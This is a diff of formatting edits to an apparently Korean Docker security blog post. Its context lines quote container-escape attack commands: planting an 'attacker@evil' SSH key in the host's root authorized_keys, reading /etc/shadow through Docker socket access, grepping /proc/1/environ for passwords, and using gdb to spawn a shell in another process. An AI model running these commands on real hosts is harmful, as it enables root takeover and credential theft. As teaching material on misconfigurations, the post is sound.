@@ -1,4 +1,4 @@
-﻿---
+---
 layout: post
 title: "Docker"
 date: 2025-11-24 17:00:00 +0900
@@ -365,7 +365,7 @@ echo "ssh-rsa AAAA... attacker@evil" >> /hostfs/root/.ssh/authorized_keys
 # 5. 호스트에 직접 SSH 접속 가능
 ```
 
-**[공격 결과]**: 컨테이너 → 호스트 루트 권한 획득 🔓
+**[공격 결과]**: 컨테이너 → 호스트 루트 권한 획득
 
 ---
 
@@ -393,7 +393,7 @@ whoami  # root
 cat /etc/shadow
 ```
 
-**[공격 결과]**: 소켓 접근 → 무제한 Docker 명령 → 호스트 루트 🔓
+**[공격 결과]**: 소켓 접근 → 무제한 Docker 명령 → 호스트 루트
 
 ---
 
@@ -420,7 +420,7 @@ ps aux
 cat /proc/1/environ | tr '\0' '\n' | grep -i password
 ```
 
-**[공격 결과]**: 다른 프로세스 메모리/환경변수 노출 🔓
+**[공격 결과]**: 다른 프로세스 메모리/환경변수 노출
 
 ---
 
@@ -446,7 +446,7 @@ gdb -p <target_pid>
 (gdb) call system("/bin/sh")
 ```
 
-**[공격 결과]**: 다른 컨테이너 프로세스 제어 🔓
+**[공격 결과]**: 다른 컨테이너 프로세스 제어
 
 ---
 
